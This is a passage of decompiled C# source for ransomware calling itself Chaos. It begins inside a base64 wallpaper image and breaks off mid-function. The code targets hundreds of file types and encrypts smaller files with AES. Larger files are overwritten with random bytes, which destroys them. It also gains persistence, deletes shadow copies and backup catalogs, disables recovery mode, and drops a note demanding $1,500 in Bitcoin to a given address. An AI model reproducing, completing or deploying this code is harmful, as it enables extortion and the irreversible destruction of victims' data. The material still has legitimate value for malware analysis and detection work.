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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[233]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe",
		".rar", ".png", ".jpg"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
